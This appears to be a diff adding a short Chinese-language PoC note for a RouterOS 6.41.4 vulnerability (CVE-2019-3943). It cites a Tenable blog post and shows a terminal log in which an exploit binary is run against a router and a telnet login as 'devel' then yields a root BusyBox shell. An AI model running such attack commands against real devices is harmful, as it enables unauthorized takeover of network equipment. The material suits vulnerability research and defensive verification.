@@ -1,0 +1,18 @@
+验证方式：验证文章
+文章链接：https://medium.com/tenable-techblog/routeros-post-exploitation-784c08044790
+目标产品：RouterOS 6.41.4
+
+poc用法：
+albinolobster@ubuntu:~/routeros_internal/poc/cve_2019_3943_defconf/build$ ./cve_2019_3493_defconf -i 192.168.1.24 -u admin
+Success!
+albinolobster@ubuntu:~/routeros_internal/poc/cve_2019_3943_defconf/build$ telnet -l devel 192.168.1.24
+Trying 192.168.1.24...
+Connected to 192.168.1.24.
+Escape character is '^]'.
+Password: 
+
+
+BusyBox v1.00 (2019.02.08-10:41+0000) Built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+# 
